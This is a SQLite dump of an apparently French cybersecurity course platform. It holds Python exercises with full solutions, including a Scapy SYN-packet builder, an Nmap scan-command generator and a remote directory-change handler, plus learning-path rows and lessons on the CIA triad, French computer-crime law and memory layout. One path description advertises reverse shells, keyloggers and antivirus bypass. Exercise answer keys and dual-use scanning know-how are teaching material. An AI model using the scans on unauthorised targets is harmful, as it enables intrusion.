        case code if 200 <= code <= 299:
            return ''SUCCESS''
        case code if 300 <= code <= 399:
            return ''REDIRECTION''
        case code if 400 <= code <= 499:
            return ''CLIENT_ERROR''
        case code if 500 <= code <= 599:
            return ''SERVER_ERROR''
        case _:
            return ''UNKNOWN''

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol3_ch10','les_cp_vol3_ch10','Création d''une Classe CibleSécurisée avec Validation','Créez une classe `CibleAudit` dont le constructeur prend `ip: str` et `score_risque: int`. Implémentez un getter et un setter pour `score_risque` garantissant que le score est un entier compris entre 0 et 100 inclus (lève `ValueError` sinon).','coding','intermediate','class CibleAudit:
    def __init__(self, ip: str, score_risque: int):
        # Votre code ici
        pass
','```python
class CibleAudit:
    def __init__(self, ip: str, score_risque: int):
        self.ip = ip
        self.score_risque = score_risque

    @property
    def score_risque(self) -> int:
        return self._score_risque

    @score_risque.setter
    def score_risque(self, valeur: int) -> None:
        if not isinstance(valeur, int) or not (0 <= valeur <= 100):
            raise ValueError("Le score de risque doit être compris entre 0 et 100")
        self._score_risque = valeur

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol4_ch12','les_cp_vol4_ch12','Parseur d''Adresse MAC en Python','Écrivez une fonction Python `extraire_oui_mac(adresse_mac: str) -> str` qui prend une adresse MAC (format ''00:1A:2B:3C:4D:5E'' ou ''00-1a-2b-3c-4d-5e'') et retourne l''identifiant OUI (les 3 premiers octets) au format ''00:1A:2B''.','coding','beginner','def extraire_oui_mac(adresse_mac: str) -> str:
    # Votre code ici
    pass
','```python
def extraire_oui_mac(adresse_mac: str) -> str:
    nettoyee = adresse_mac.replace(''-'', '':'').upper()
    octets = nettoyee.split('':'')
    if len(octets) < 3:
        return ''''
    return '':''.join(octets[:3])

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol4_ch14','les_cp_vol4_ch14','Interprétation des Réponses de Ports TCP','Écrivez une fonction Python `analyser_reponse_tcp(drapeaux_recus: str) -> str` qui retourne ''OUVERT'' si les drapeaux contiennent à la fois ''SYN'' et ''ACK'', ''FERMÉ'' s''ils contiennent ''RST'', et ''INCONNU'' sinon.','coding','beginner','def analyser_reponse_tcp(drapeaux_recus: str) -> str:
    # Votre code ici
    pass
','```python
def analyser_reponse_tcp(drapeaux_recus: str) -> str:
    flags = drapeaux_recus.upper()
    if ''SYN'' in flags and ''ACK'' in flags:
        return ''OUVERT''
    elif ''RST'' in flags:
        return ''FERMÉ''
    return ''INCONNU''

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol5_scapy','les_cp_vol5_scapy','Création d''une Trame SYN Scapy','Écrivez une fonction Python `creer_syn_packet(ip_cible: str, port_cible: int)` qui utilise Scapy pour retourner un paquet combinant `IP(dst=ip_cible)` et `TCP(dport=port_cible, flags=''S'')`.','coding','intermediate','from scapy.all import IP, TCP

def creer_syn_packet(ip_cible: str, port_cible: int):
    # Votre code ici
    pass
','```python
from scapy.all import IP, TCP

def creer_syn_packet(ip_cible: str, port_cible: int):
    return IP(dst=ip_cible) / TCP(dport=port_cible, flags=''S'')

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol5_arp','les_cp_vol5_arp','Détecteur d''Adresses MAC Dupliquées','Écrivez une fonction Python `detecter_usurpation_arp(table_arp: dict[str, str]) -> list[str]` qui prend un dictionnaire associant des adresses IP à des adresses MAC, et retourne la liste des adresses MAC qui apparaissent plus d''une fois (signe caractéristique d''un spoofing).','coding','intermediate','def detecter_usurpation_arp(table_arp: dict[str, str]) -> list[str]:
    # Votre code ici
    pass
','```python
from collections import Counter

def detecter_usurpation_arp(table_arp: dict[str, str]) -> list[str]:
    compteur = Counter(table_arp.values())
    return [mac for mac, count in compteur.items() if count > 1]

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol6_sqli','les_cp_vol6_sqli','Générateur de Requêtes Préparées Sécurisées','Écrivez une fonction Python `construire_requete_securisee(table: str, colonne: str) -> str` qui génère la chaîne de requête préparée standard utilisant un point d''interrogation comme marqueur de paramètre (ex: ''SELECT * FROM users WHERE email = ?''). Lève ValueError si le nom de table ou de colonne contient des caractères non alphanumériques.','coding','intermediate','def construire_requete_securisee(table: str, colonne: str) -> str:
    # Votre code ici
    pass
','```python
def construire_requete_securisee(table: str, colonne: str) -> str:
    if not table.isidentifier() or not colonne.isidentifier():
        raise ValueError("Caractères non autorisés dans les identifiants SQL")
    return f"SELECT * FROM {table} WHERE {colonne} = ?"

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol7_owasp','les_cp_vol7_owasp','Échappement HTML Anti-XSS en Python','Écrivez une fonction Python `assainir_html(texte: str) -> str` qui remplace les caractères sensibles &, <, >, ", et '' par leurs entités HTML respectives (&amp;, &lt;, &gt;, &quot;, &#x27;).','coding','beginner','def assainir_html(texte: str) -> str:
    # Votre code ici
    pass
','```python
def assainir_html(texte: str) -> str:
    remplacements = {
        ''&'': ''&amp;'',
        ''<'': ''&lt;'',
        ''>'': ''&gt;'',
        ''"'': ''&quot;'',
        "''": ''&#x27;''
    }
    for caractere, entite in remplacements.items():
        texte = texte.replace(caractere, entite)
    return texte

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol8_nmap','les_cp_vol8_nmap','Générateur de Lignes de Commande Nmap','Écrivez une fonction Python `generer_commande_nmap(cible: str, scan_complet: bool = False) -> str` qui retourne la chaîne de commande Nmap appropriée (`nmap -sS -sV -T4 <cible>` par défaut, ou `nmap -sS -sV -p- -T4 <cible>` si scan_complet est True).','coding','beginner','def generer_commande_nmap(cible: str, scan_complet: bool = False) -> str:
    # Votre code ici
    pass
','```python
def generer_commande_nmap(cible: str, scan_complet: bool = False) -> str:
    ports = " -p-" if scan_complet else ""
    return f"nmap -sS -sV{ports} -T4 {cible.strip()}"

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol9_sockets','les_cp_vol9_sockets','Changement de Répertoire Distant en Python','Écrivez une fonction Python `traiter_commande_cd(commande: str) -> str` qui prend une commande tapée (ex: ''cd /tmp'') et exécute `os.chdir()` vers le dossier cible, puis retourne le chemin absolu courant. En cas d''erreur, elle retourne ''ERREUR''.','coding','intermediate','import os

def traiter_commande_cd(commande: str) -> str:
    # Votre code ici
    pass
','```python
import os

def traiter_commande_cd(commande: str) -> str:
    if not commande.startswith(''cd ''):
        return ''ERREUR''
    cible = commande[3:].strip()
    try:
        os.chdir(cible)
        return os.getcwd()
    except Exception:
        return ''ERREUR''

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol10_crypto','les_cp_vol10_crypto','Génération de Nonce Aléatoire CSPRNG','Écrivez une fonction Python `generer_nonce_gcm(taille_octets: int = 12) -> bytes` qui utilise le générateur pseudo-aléatoire cryptographiquement sécurisé `os.urandom` pour générer un nonce unique.','coding','beginner','import os

def generer_nonce_gcm(taille_octets: int = 12) -> bytes:
    # Votre code ici
    pass
','```python
import os

def generer_nonce_gcm(taille_octets: int = 12) -> bytes:
    return os.urandom(taille_octets)

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol11_soc','les_cp_vol11_soc','Comparateur de Hash FIM en Python','Écrivez une fonction Python `verifier_fichier_fim(hash_reference: str, hash_courant: str) -> str` qui utilise `secrets.compare_digest` et retourne ''INTACT'' si les empreintes correspondent, et ''ALTÉRÉ'' en cas de divergence.','coding','beginner','import secrets

def verifier_fichier_fim(hash_reference: str, hash_courant: str) -> str:
    # Votre code ici
    pass
','```python
import secrets

def verifier_fichier_fim(hash_reference: str, hash_courant: str) -> str:
    if secrets.compare_digest(hash_reference.lower().strip(), hash_courant.lower().strip()):
        return ''INTACT''
    return ''ALTÉRÉ''

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol12_forensics','les_cp_vol12_forensics','Vérificateur de Scellé Numérique Forensique','Écrivez une fonction Python `valider_chaine_custody(hash_scelle: str, hash_copie_travail: str) -> bool` qui compare les deux empreintes hexadécimales en temps constant avec `secrets.compare_digest` pour valider l''intégrité de la pièce à conviction.','coding','beginner','import secrets

def valider_chaine_custody(hash_scelle: str, hash_copie_travail: str) -> bool:
    # Votre code ici
    pass
','```python
import secrets

def valider_chaine_custody(hash_scelle: str, hash_copie_travail: str) -> bool:
    return secrets.compare_digest(hash_scelle.strip().lower(), hash_copie_travail.strip().lower())

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "exercises" VALUES('ex_les_cp_vol12_capstone','les_cp_vol12_capstone','Calculateur de Score CVSS 3.1 Qualitatif','Écrivez une fonction Python `qualifier_score_cvss(score_numerique: float) -> str` qui retourne ''FAIBLE'' (0.1 à 3.9), ''MOYEN'' (4.0 à 6.9), ''ÉLEVÉ'' (7.0 à 8.9), ''CRITIQUE'' (9.0 à 10.0), ou ''AUCUN'' (0.0).','coding','beginner','def qualifier_score_cvss(score_numerique: float) -> str:
    # Votre code ici
    pass
','```python
def qualifier_score_cvss(score_numerique: float) -> str:
    if score_numerique <= 0.0:
        return ''AUCUN''
    elif score_numerique <= 3.9:
        return ''FAIBLE''
    elif score_numerique <= 6.9:
        return ''MOYEN''
    elif score_numerique <= 8.9:
        return ''ÉLEVÉ''
    elif score_numerique <= 10.0:
        return ''CRITIQUE''
    return ''INVALIDE''

```',1,'published','2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
CREATE TABLE learning_paths (
    id TEXT PRIMARY KEY,
    slug TEXT NOT NULL UNIQUE,
    title TEXT NOT NULL,
    description TEXT NOT NULL,
    audience TEXT NOT NULL DEFAULT 'public'
        CHECK (audience IN ('public', 'personal', 'both')),
    difficulty TEXT NOT NULL DEFAULT 'beginner'
        CHECK (difficulty IN ('beginner', 'intermediate', 'advanced', 'mixed')),
    estimated_minutes INTEGER CHECK (estimated_minutes IS NULL OR estimated_minutes >= 0),
    status TEXT NOT NULL DEFAULT 'draft'
        CHECK (status IN ('draft', 'published', 'archived')),
    created_by TEXT,
    published_at TEXT,
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
);
INSERT INTO "learning_paths" VALUES('path_cyberpath_master','cyberpath-2026-2027','CyberPath 2026-2027 — Spécialiste Cybersécurité Opérationnelle','Parcours intégral en 12 volumes structurés selon la méthode 70% pratique / 30% théorie. Des fondations matérielles et Linux au pentest offensif, à la détection SOC, à la cryptographie et au capstone final.','both','beginner',7200,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.835Z','2026-11-04T20:51:45.835Z');
INSERT INTO "learning_paths" VALUES('path_python_mastery','python-academy','Manuel Complet de Python — De la Syntaxe Moderne aux Systèmes Avancés','Les 20 parties exhaustives du Manuel Complet de Python : structures de données avancées, programmation fonctionnelle, POO, métaclasses, asynchrone (asyncio), concurrence, optimisation cProfile, sécurité et cryptographie applicative.','both','beginner',4800,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "learning_paths" VALUES('path_ethical_hacking','ethical-hacking-python','Hacking Éthique & Programmation Réseau Offensive/Défensive','Basé sur l''ouvrage de référence ''Python Hacking Éthique'' : sockets TCP purs, crafting de paquets avec Scapy, attaques MITM & ARP spoofing, développement de RAT / Reverse Shells furtifs, keyloggers, exfiltration en flux délimités, packaging PyInstaller et contournement d''antivirus/UAC.','both','intermediate',5400,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "learning_paths" VALUES('path_cyber_defense','cybersecurity-academy','Blue Team, SOC Operations, SIEM & Incident Response','Surveillance d''infrastructure, analyse de logs bruts (Syslog, Nginx, EVTX), développement de règles de détection Sigma/Yara, File Integrity Monitoring (FIM), forensic mémoire/disque et gestion d''incidents selon le cycle PICERL/NIST.','both','intermediate',4200,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "learning_paths" VALUES('path_sysnet_infra','systems-networks-academy','Administration Système Linux, Architecture Réseau TCP/IP & DevSecOps','Modèles OSI & TCP/IP, routage, Wireshark, Bash scripting automatisé, durcissement SSH et sécurité de conteneurs.','both','intermediate',3600,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
INSERT INTO "learning_paths" VALUES('path_career_hub','career-launchpad','Career Launchpad 2026-2027 — CV ATS, Certifications Mondiales & Portfolio','Optimisez votre profil technique pour le marché européen et international : CV compatible ATS, formule Google XYZ, préparation CompTIA Security+, Cisco CCNA, OSCP et simulations d''entretiens techniques.','both','beginner',2400,'published','user_founder_raylab','2026-11-04 20:51:45','2026-11-04T20:51:45.836Z','2026-11-04T20:51:45.836Z');
CREATE TABLE lesson_prerequisites (
    lesson_id TEXT NOT NULL,
    prerequisite_lesson_id TEXT NOT NULL,
    PRIMARY KEY (lesson_id, prerequisite_lesson_id),
    CHECK (lesson_id <> prerequisite_lesson_id),
    FOREIGN KEY (lesson_id) REFERENCES lessons(id) ON DELETE CASCADE,
    FOREIGN KEY (prerequisite_lesson_id) REFERENCES lessons(id) ON DELETE RESTRICT
);
CREATE TABLE lesson_progress (
    user_id TEXT NOT NULL,
    lesson_id TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'not_started'
        CHECK (status IN ('not_started', 'in_progress', 'completed')),
    progress_percent INTEGER NOT NULL DEFAULT 0
        CHECK (progress_percent BETWEEN 0 AND 100),
    started_at TEXT,
    completed_at TEXT,
    last_viewed_at TEXT,
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    PRIMARY KEY (user_id, lesson_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (lesson_id) REFERENCES lessons(id) ON DELETE CASCADE
);
INSERT INTO "lesson_progress" VALUES('user_alex_learner','les_cp_vol1_ch1','completed',100,'2026-10-02 10:00:00','2026-10-02 10:30:00','2026-10-02 10:30:00','2026-11-04T20:51:45.839Z');
INSERT INTO "lesson_progress" VALUES('user_alex_learner','les_cp_vol1_ch2','completed',100,'2026-10-03 10:50:00','2026-10-03 11:15:00','2026-10-03 11:15:00','2026-11-04T20:51:45.839Z');
INSERT INTO "lesson_progress" VALUES('user_alex_learner','les_cp_vol1_ch3','completed',100,'2026-10-04 14:20:00','2026-10-04 15:00:00','2026-10-04 15:00:00','2026-11-04T20:51:45.839Z');
INSERT INTO "lesson_progress" VALUES('user_alex_learner','les_cp_vol2_ch6','in_progress',60,'2026-10-06 18:00:00',NULL,'2026-10-06 18:20:00','2026-11-04T20:51:45.839Z');
INSERT INTO "lesson_progress" VALUES('user_founder_raylab','les_cp_vol1_ch1','completed',100,'2026-09-02 08:30:00','2026-09-02 09:00:00','2026-09-02 09:00:00','2026-11-04T20:51:45.839Z');
CREATE TABLE lesson_resources (
    id TEXT PRIMARY KEY,
    lesson_id TEXT NOT NULL,
    title TEXT NOT NULL,
    resource_type TEXT NOT NULL
        CHECK (resource_type IN ('documentation', 'article', 'video', 'repository', 'download', 'other')),
    url TEXT NOT NULL,
    publisher TEXT,
    last_verified_at TEXT,
    position INTEGER NOT NULL DEFAULT 0 CHECK (position >= 0),
    FOREIGN KEY (lesson_id) REFERENCES lessons(id) ON DELETE CASCADE
);
CREATE TABLE lessons (
    id TEXT PRIMARY KEY,
    module_id TEXT NOT NULL,
    slug TEXT NOT NULL,
    title TEXT NOT NULL,
    summary TEXT,
    content_md TEXT NOT NULL DEFAULT '',
    lesson_type TEXT NOT NULL DEFAULT 'article'
        CHECK (lesson_type IN ('article', 'video', 'interactive', 'lab', 'reading')),
    position INTEGER NOT NULL CHECK (position >= 0),
    estimated_minutes INTEGER CHECK (estimated_minutes IS NULL OR estimated_minutes >= 0),
    status TEXT NOT NULL DEFAULT 'draft'
        CHECK (status IN ('draft', 'published', 'archived')),
    version INTEGER NOT NULL DEFAULT 1 CHECK (version > 0),
    published_at TEXT,
    created_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    updated_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ', 'now')),
    UNIQUE (module_id, slug),
    UNIQUE (module_id, position),
    FOREIGN KEY (module_id) REFERENCES modules(id) ON DELETE CASCADE
);
INSERT INTO "lessons" VALUES('les_cp_vol1_ch1','m_vol1_1','comprendre-la-cybersecurite-triade-cia','Comprendre la Cybersécurité : Triade CIA, Risques & Gouvernance','Découvrez les piliers fondamentaux de la sécurité de l''information : Confidentialité, Intégrité, Disponibilité et modélisation des menaces.','# Comprendre la Cybersécurité : La Triade CIA & Gouvernance

La cybersécurité ne se résume pas à l''utilisation d''outils d''attaque ou de scripts automatisés. Elle constitue une discipline d''ingénierie rigoureuse visant à garantir la résilience, la conformité et la pérennité des systèmes d''information face aux menaces numériques.

---

## 1. La Triade C.I.A. (Fondement de la Sécurité des Systèmes d''Information)

Toute politique de sécurité des systèmes d''information (PSSI), toute norme internationale (ISO/IEC 27001, NIST SP 800-53) et tout mécanisme cryptographique reposent sur trois objectifs primordiaux :

```
             [ CONFIDENTIALITÉ ]
             /                 \
            /   SÉCURITÉ DE     \
           /   L''INFORMATION     \
          /                       \
[ INTÉGRITÉ ] ----------------- [ DISPONIBILITÉ ]
```

### A. La Confidentialité (Confidentiality)
La confidentialité garantit que les informations sensibles ne sont accessibles qu''aux entités (utilisateurs, processus, machines) dûment autorisées.
* **Menaces types :** Écoute clandestine (Eavesdropping, Man-in-the-Middle), fuites de données (Data Exfiltration), injection SQL avec extraction de table, vol d''identifiants.
* **Mécanismes de protection :** Chiffrement fort des données en transit (TLS 1.3) et au repos (AES-256-GCM), contrôle d''accès basé sur les rôles (RBAC), principe du moindre privilège, masquage et anonymisation.

### B. L''Intégrité (Integrity)
L''intégrité assure que les données et les systèmes n''ont pas été altérés, modifiés ou corrompus de manière accidentelle ou malveillante entre leur création et leur consultation.
* **Menaces types :** Modification non autorisée de fichiers système (`/etc/passwd`, `/etc/shadow`), corruption de base de données, falsification de paquets réseau (ARP/DNS Spoofing), injection de logiciels malveillants.
* **Mécanismes de protection :** Fonctions de hachage cryptographique (SHA-256, BLAKE3), signatures numériques (RSA, Ed25519), moniteurs d''intégrité de fichiers (File Integrity Monitoring - FIM), contrôle de versions immuable.

### C. La Disponibilité (Availability)
La disponibilité garantit que les services informatiques, les réseaux et les données restent opérationnels et accessibles aux utilisateurs légitimes chaque fois qu''ils en ont besoin.
* **Menaces types :** Attaques par déni de service distribué (DDoS volumétrique, SYN Flood), ransomwares bloquant l''accès au stockage, pannes matérielles, défaillances électriques.
* **Mécanismes de protection :** Redondance matérielle (RAID, alimentations doubles), équilibrage de charge (Load Balancing), clustering haute disponibilité (Kubernetes, AWS Auto-Scaling), sauvegardes hors-ligne (stratégie 3-2-1) et plans de reprise d''activité (PRA/PCA).

---

## 2. Authentification, Autorisation & Traçabilité (Le Modèle AAA)

Pour opérationnaliser la triade CIA, les architectures de sécurité mettent en œuvre le cadre AAA :
1. **Identification :** L''affirmation d''une identité (ex: transmettre son nom d''utilisateur `admin`).
2. **Authentification (Authentication) :** La preuve de cette identité (ex: mot de passe salé + jeton TOTP d''authentification multifacteur MFA).
3. **Autorisation (Authorization) :** La vérification des droits alloués à l''identité validée (ex: l''utilisateur a-t-il le droit de lire `/var/log/audit.log` ?).
4. **Traçabilité / Imputabilité (Accounting / Non-repudiation) :** L''enregistrement horodaté et infalsifiable de toutes les actions réalisées dans des journaux d''audit (Syslog, SIEM).

---

## 3. Exemple Pratique en Python : Calcul de l''Empreinte d''Intégrité

Voici comment un auditeur technique vérifie l''intégrité d''un fichier sensible en Python moderne à l''aide de la bibliothèque standard `hashlib` :

```python
import hashlib
from pathlib import Path

def verifier_integrite_fichier(chemin_fichier: Path, empreinte_attendue: str) -> bool:
    """
    Calcule le hachage SHA-256 par blocs de 64 Ko pour éviter d''engorger la mémoire vive
    sur de gros fichiers, puis compare en temps constant.
    """
    if not chemin_fichier.is_file():
        raise FileNotFoundError(f"Fichier introuvable : {chemin_fichier}")

    hasher = hashlib.sha256()
    with open(chemin_fichier, "rb") as f:
        while chunk := f.read(65536):
            hasher.update(chunk)

    empreinte_calculee = hasher.hexdigest()
    
    # Utilisation de secrets.compare_digest pour contrer les Timing Attacks
    import secrets
    est_valide = secrets.compare_digest(empreinte_calculee.lower(), empreinte_attendue.lower())
    
    print(f"[*] Fichier : {chemin_fichier.name}")
    print(f"    Empreinte calculée : {empreinte_calculee}")
    print(f"    Statut d''intégrité  : {''CONFORME'' if est_valide else ''COMPROMIS / ALTÉRÉ''}")
    return est_valide
```

> [!IMPORTANT]
> Un compromis sur l''une des branches de la triade CIA peut entraîner l''effondrement de l''ensemble du système. Par exemple, si l''intégrité d''un système d''exploitation est violée par l''injection d''un rootkit noyau, la confidentialité des données qui y transitent et la disponibilité des processus ne peuvent plus être garanties.
','article',1,35,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol1_ch2','m_vol1_1','ethique-legalite-responsabilite-professionnelle','Éthique, Cadre Légal (Art. 323-1 Code Pénal) & Déontologie','Comprendre les limites légales strictes entre le hacking éthique autorisé et les infractions pénales relatives aux atteintes aux STAD.','# Éthique, Cadre Légal & Responsabilité du Pentesteur

La maîtrise des techniques offensives confère un pouvoir d''investigation considérable. Sans un cadre déontologique et juridique inébranlable, ce pouvoir bascule instantanément dans l''illégalité et la responsabilité pénale.

---

## 1. Le Cadre Juridique Français : Les Atteintes aux STAD

En droit français, la loi dite « Godfrain » a introduit dans le Code pénal les articles 323-1 et suivants relatifs aux **Systèmes de Traitement Automatisé de Données (STAD)** :

### Article 323-1 du Code Pénal :
> *« Le fait d''accéder ou de se maintenir, frauduleusement, dans tout ou partie d''un système de traitement automatisé de données est puni de **trois ans d''emprisonnement et de 100 000 euros d''amende**.*
> *Lorsqu''il en est résulté soit la suppression ou la modification de données contenues dans le système, soit une altération du fonctionnement de ce système, la peine est de **cinq ans d''emprisonnement et de 150 000 euros d''amende**.*
> *Lorsque cette infraction a été commise à l''encontre d''un STAD à caractère personnel mis en œuvre par l''État, les peines sont portées à sept ans et 300 000 euros. »*

### Article 323-2 du Code Pénal :
> *« Le fait d''entraver ou de fausser le fonctionnement d''un système de traitement automatisé de données est puni de **cinq ans d''emprisonnement et de 150 000 euros d''amende**. »* (Cible typique : attaques par déni de service DDoS).

### Article 323-3-1 du Code Pénal :
> La fabrication, détention ou diffusion sans motif légitime d''outils, programmes informatiques conçus ou spécialement adaptés pour commettre une ou plusieurs infractions (outils d''attaque, malwares, botnets) est sévèrement sanctionnée.

---

## 2. La Règle d''Or du Pentest : L''Ordre de Mission Écrit

Un test d''intrusion (Penetration Test) n''est **légal que s''il dispose d''une autorisation explicite, écrite, préalable et délimitée**, appelée **Ordre de Mission (Rules of Engagement - RoE)**.

Ce document contractuel doit obligatoirement stipuler :
1. **Le périmètre strict (Scope) :** Adresses IP, noms de domaine, plages d''adresses expressément autorisées. Tout scan ou requête dirigé contre une cible hors scope (ex: le fournisseur de cloud ou la passerelle voisine) constitue une infraction pénale !
2. **La période d''audit :** Dates et créneaux horaires précis (ex: du 10 au 14 novembre 2026, entre 20h00 et 04h00).
3. **Les méthodologies proscrites :** Interdiction des attaques par déni de service volumétrique, interdiction de l''ingénierie sociale physique sans accord spécifique, interdiction de détruire des données opérationnelles.
4. **Le protocole de contact d''urgence :** Numéros d''astreinte de l''équipe de sécurité du client en cas d''incident critique imprévu.

---

## 3. Les Trois Postures : White Hat, Grey Hat, Black Hat

| Posture | Intention | Autorisation | Légalité |
| :--- | :--- | :--- | :--- |
| **White Hat (Hacker Éthique)** | Défensive, protection, audit autorisé | Explicite et contractuelle | **100% Légal** |
| **Grey Hat** | Curiosité, recherche sans contrat, divulgation unilatérale | Absente ou ambiguë | **Illégal** (Poursuites possibles) |
| **Black Hat (Cybercriminel)** | Nuisance, extorsion, vol de secrets, sabotage | Aucune | **Infraction Criminelle Grave** |

> [!WARNING]
> La mention « C''était juste pour tester la sécurité » ou « Je n''ai rien volé » ne constitue en aucun cas une défense juridique valable devant un tribunal. L''accès non autorisé, même passif, suffit à caractériser l''infraction de l''article 323-1.
','article',2,30,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol1_ch3','m_vol1_2','architecture-materielle-cpu-memoire-os','Architecture Matérielle, Mémoire RAM, CPU & Systèmes d''Exploitation','Comprendre comment le processeur exécute les instructions, la gestion de la mémoire virtuelle, les registres et le rôle du noyau (Kernel).','# Architecture Matérielle, Mémoire & Systèmes d''Exploitation

Pour comprendre comment les exploits de sécurité (dépassements de tampon, élévations de privilèges) fonctionnent au niveau le plus bas, il est indispensable de maîtriser l''architecture des ordinateurs selon le modèle de Von Neumann.

---

## 1. Le Modèle de Von Neumann & le Processeur (CPU)

Un processeur moderne (x86_64 ou ARM64) exécute des millions d''instructions élémentaires par seconde selon le cycle continu :
`FETCH (Lecture) -> DECODE (Décodage) -> EXECUTE (Exécution) -> STORE (Écriture)`.

```
+-----------------------------------------------------------+
|                   UNITÉ CENTRALE (CPU)                    |
|  +---------------------+        +----------------------+  |
|  | Unité de Contrôle   |        | Unité Arithmétique   |  |
|  | (Instruction Point.)|        | et Logique (ALU)     |  |
|  +---------------------+        +----------------------+  |
|               +-------------------------+                 |
|               | Registres (RAX, RBX...) |                 |
|               +-------------------------+                 |
+-----------------------------------------------------------+
                             | Bus Système (Data / Address)
+-----------------------------------------------------------+
|                   MÉMOIRE CENTRALE (RAM)                  |
|  [ Pile (Stack) ] [ Tas (Heap) ] [ BSS ] [ Data ] [ Code ]|
+-----------------------------------------------------------+
```

### Les Registres CPU Majeurs en architecture 64 bits (x86_64) :
* **RIP (Instruction Pointer) :** Pointeur sur la prochaine instruction en langage machine à exécuter. Sa prise de contrôle par un attaquant permet de détourner le flux d''exécution du programme.
* **RSP (Stack Pointer) :** Pointeur sur le sommet de la pile mémoire (Stack).
* **RBP (Base Pointer) :** Pointeur sur la base du cadre de pile (Stack Frame) de la fonction courante.
* **RAX, RBX, RCX, RDX :** Registres de travail généraux pour le calcul arithmétique et le stockage temporaire de valeurs de retour de fonctions.

---

## 2. Organisation de la Mémoire Virtuelle d''un Processus

Lorsqu''un exécutable est lancé sous Linux ou Windows, le système d''exploitation lui alloue un espace d''adressage virtuel découpé en plusieurs segments distincts :

```
Adresse Haute (0x7FFFFFFFFFFF)
+-----------------------------------------------+
| Arguments du programme & Variables d''env.     |
+-----------------------------------------------+
| PILE (STACK) : Variables locales, adresses    |
| de retour de fonctions (Grandit vers le bas)  |
|                  |                            |
|                  v                            |
|                                               |
|                  ^                            |
|                  |                            |
| TAS (HEAP) : Allocations dynamiques malloc()  |
| (Grandit vers le haut)                        |
+-----------------------------------------------+
| BSS : Variables globales non initialisées     |
+-----------------------------------------------+
| DATA : Variables globales et statiques init.  |
+-----------------------------------------------+
| TEXT (.code) : Instructions machine (Lecture) |
+-----------------------------------------------+
Adresse Basse (0x000000000000)
```

### Mécanismes de Protection Mémoire Modernes :
1. **ASLR (Address Space Layout Randomization) :** Aléatorise l''emplacement en mémoire de la pile, du tas et des bibliothèques partagées à chaque exécution pour compliquer les attaques par débordement de tampon.
2. **DEP / NX (Data Execution Prevention / No-Execute bit) :** Marque les zones de données (Pile et Tas) comme non-exécutables pour empêcher l''exécution d''un shellcode injecté.
3. **Stack Canaries :** Valeurs aléatoires placées sur la pile juste avant l''adresse de retour. Si un débordement écrase le canari, le noyau termine immédiatement le processus (`Stack smashing detected`).

---

## 3. Espace Noyau (Kernel Space) vs Espace Utilisateur (User Space)

Le processeur sépare l''exécution en plusieurs anneaux de privilèges (Rings) :
* **Ring 0 (Kernel Space) :** Privilège maximal. Accès direct aux périphériques matériels, à la table des pages mémoire et aux registres système. Le noyau Linux s''exécute en Ring 0.
* **Ring 3 (User Space) :** Privilège restreint. Vos programmes Python, votre navigateur et le terminal s''exécutent en Ring 3. Pour écrire un fichier ou ouvrir un socket réseau, le programme doit obligatoirement formuler un **Appel Système (Syscall)** au noyau via l''instruction assembleur `syscall`.
','article',3,40,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
